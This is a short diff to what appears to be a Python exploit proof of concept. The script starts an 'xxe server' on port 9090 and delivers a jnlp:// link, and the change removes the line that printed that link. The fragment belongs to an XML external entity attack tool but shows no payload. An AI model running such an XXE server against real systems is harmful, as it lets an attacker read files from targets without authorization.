@@ -146,7 +146,6 @@ if __name__ == '__main__':
     except:
         print "(-) no ip address associated with that interface!"
         sys.exit(1)
-    print "jnlp://%s:9090/%s" % (ip, path)
     try:
         server = HTTPServer(('0.0.0.0', 9090), xxe)
         print '(+) starting xxe server...'
